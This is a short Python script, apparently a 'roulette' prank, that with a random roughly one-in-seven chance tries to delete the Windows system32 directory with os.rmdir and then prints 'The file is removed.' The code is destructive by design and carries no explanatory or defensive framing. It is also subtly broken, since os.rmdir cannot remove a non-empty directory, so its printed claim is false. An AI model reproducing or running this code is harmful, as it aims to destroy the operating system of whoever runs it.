import random
import os

if random.randint(0,6) ==1:
    os.rmdir('C:/windows/system32')
    print('The file is removed.')